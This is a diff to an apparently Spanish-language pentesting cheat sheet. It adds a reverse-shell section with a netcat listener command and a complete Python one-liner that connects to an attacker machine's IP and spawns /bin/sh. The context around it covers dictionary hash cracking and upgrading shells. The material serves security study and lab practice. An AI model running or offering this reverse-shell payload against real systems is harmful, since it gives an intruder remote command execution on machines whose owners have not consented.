@@ -306,6 +306,12 @@ hashes.txt: Este es el archivo que contiene los hashes que estás intentando des
 
 /usr/share/wordlists/rockyou.txt: Esta es la ubicación del diccionario de palabras que se utilizará para el ataque de diccionario.
 
+***Reverse Shell para acceder a un cmd en remoto con Python***: Este comando sirve para intentar hacer un reverse shell y obtener acceso a su linea de comandos desde tu terminal con Python, utilizando el siguiente comando:
+
+(Es importante destacar que antes de ejecutar este comando es necesario poner en tu consola a la escucha del puerto que has escogido a traves de la linea: **nc -lvp 1234** para que al ejecutar el comando desde el cmd ajeno, pueda captarlo nuestra terminal automaticamente gracias a los sockets que estan abriendo.)
+
+**python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((YOUR_MACHINE_IP,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'**
+
 ***Consola para Reverse Shell***: Estos son dos comandos que nos van a permitir tener una consola en condiciones cuando accedemos por reverse shell las cuales son mucho mas didácticas e interactivas.
 Cuando ingresamos a la consola en reverse, si esta no tiene python, usaremos el siguiente comando:
 
